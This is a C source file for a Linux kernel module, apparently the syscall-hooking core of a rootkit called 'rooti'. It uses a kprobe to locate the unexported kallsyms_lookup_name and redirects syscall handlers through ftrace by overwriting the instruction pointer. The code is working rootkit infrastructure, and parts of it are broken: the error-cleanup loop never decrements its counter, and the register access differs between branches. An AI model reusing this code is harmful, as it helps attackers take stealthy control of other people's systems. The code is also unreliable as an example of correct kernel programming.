#include <linux/ftrace.h>
#include <linux/kprobes.h>

unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;

// TODO: document recursion mechanisms and rooti_ftrace_hook struct

#define ROOTI_USE_FENTRY_OFFSET 0
#if !ROOTI_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Represents a syscall hook based on the ftrace framework.
struct rooti_ftrace_hook {
    const char *name;      // hooked syscall name
    void *func;            // pointer to hook function
    void *orig;            

    unsigned long addr;
    struct ftrace_ops ops; // ftrace options
};

/* PROTOTYPES */
int rooti_hooking_init(void);
int rooti_install_hook(struct rooti_ftrace_hook *hook);
int rooti_install_hooks(struct rooti_ftrace_hook *hooks, size_t count);
void rooti_uninstall_hook(struct rooti_ftrace_hook *hook);
void rooti_uninstall_hooks(struct rooti_ftrace_hook *hooks, size_t count);

// On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'.
#ifdef CONFIG_X86_64
#define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
#else
#define ROOTI_SYSCALL_NAME(name) (name)
#endif

// Shorthand for initializing syscall hook objects
#define ROOTI_HOOK(_name, _hook, _orig) \
{ \
    .name = ROOTI_SYSCALL_NAME(_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

/* 
    Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported.
    We can work around this by probing the kallsyms_lookup_name() with functions from kprobes.h
    One of the things that probing a function gives us is its address in kernel memory.
*/
static unsigned long rooti_resolve_kln_addr(void)
{
    struct kprobe kp;
    unsigned long addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        return 0;
    }

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/*
    Locates the memory address of the symbol of the requested function to hook. If the recursion protection
    mechanism in use dictates that the call to ftrace callback should be skipped, then the offset is added
    to the memory address of the function, skipping the instruction for calling ftrace.
*/
static unsigned long rooti_resolve_syscall_handler_addr(struct rooti_ftrace_hook *hook)
{
    // Resolve the address of the requested symbol
    hook->addr = __kallsyms_lookup_name(hook->name);
    if (hook->addr == 0) {
        printk(KERN_DEBUG "rooti: unresolved symbol: %s\n", hook->name);
        return -EINVAL;
    }

#if ROOTI_USE_FENTRY_OFFSET
    // Skip over the ftrace call - recursion protection mechanism
    *((unsigned long *)hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->orig) = hook->addr;
#endif

    return 0;
}

/*
    Callback function for registered traced function. This callback will set the IP register (in the context of the traced function)
    to the memory address of our function, effectively hooking the call.
*/
static void notrace rooti_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    // Obtain a pointer to the container rooti_ftrace_hook struct
    struct rooti_ftrace_hook *hook = container_of(ops, struct rooti_ftrace_hook, ops);

#if ROOTI_USE_FENTRY_OFFSET
    regs->iregs.ip = (unsigned long)hook->func;
#else
    if(!within_module(parent_ip, THIS_MODULE)) {
        regs->regs.ip = (unsigned long)hook->func;
    }
#endif
}

/*
    Installs a new syscall hook using the ftrace method.
*/
int rooti_install_hook(struct rooti_ftrace_hook *hook)
{
    // Resolve the address of the symbol in kernel memory
    int ret = rooti_resolve_syscall_handler_addr(hook);
    if (ret < 0) {
        return ret;
    }
    // Register the callback function
    hook->ops.func = rooti_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    // Set IP filter for the memory address of the original syscall handler
    ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: ftrace_set_filter_ip() failed: %d\n", ret);
        return ret;
    }
    // Register the function
    ret = register_ftrace_function(&hook->ops);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: register_ftrace_function() failed: %d\n", ret);
        return ret;
    }

    return 0;
}

/*
    Uninstalls a registered hook by unregistering the ftrace callback function
    and removing the IP ftrace filter at the memory address of the original syscall handler.
*/
void rooti_uninstall_hook(struct rooti_ftrace_hook *hook)
{
    int ret;

    // Unregister hook function
    ret = unregister_ftrace_function(&hook->ops);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: unregister_ftrace_function() failed: %d\n", ret);
    }
    // Remove ftrace filter
    ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: ftrace_set_filter_ip() failed: %d\n", ret);
    }
}

/*
    Installs all the hooks at the given hooks array.
*/
int rooti_install_hooks(struct rooti_ftrace_hook *hooks, size_t count)
{
    int ret;
    int i = 0;

    for (i = 0; i < count; i++) {
        ret = rooti_install_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_hook(&hooks[i]);
    }
    return ret;
}

/*
    Uninstalls all registered hooks in the hooks array.
*/
void rooti_uninstall_hooks(struct rooti_ftrace_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_hook(&hooks[i]);
    }
}

/*
    Some initialization of local data structures that make the function hooking possible.
    This function is to be called once at the beginning of the program, before installing any hooks.
*/
int rooti_hooking_init(void) {
    // Resolve the address of kallsyms_lookup_name()
    __kallsyms_lookup_name = (unsigned long (*)(const char *name))rooti_resolve_kln_addr();
    if (__kallsyms_lookup_name == NULL) {
        printk(KERN_DEBUG "rooti: rooti_resolve_kln_addr() failed: the symbol could not be found\n");
        return -EINVAL;
    }
    return 0;
}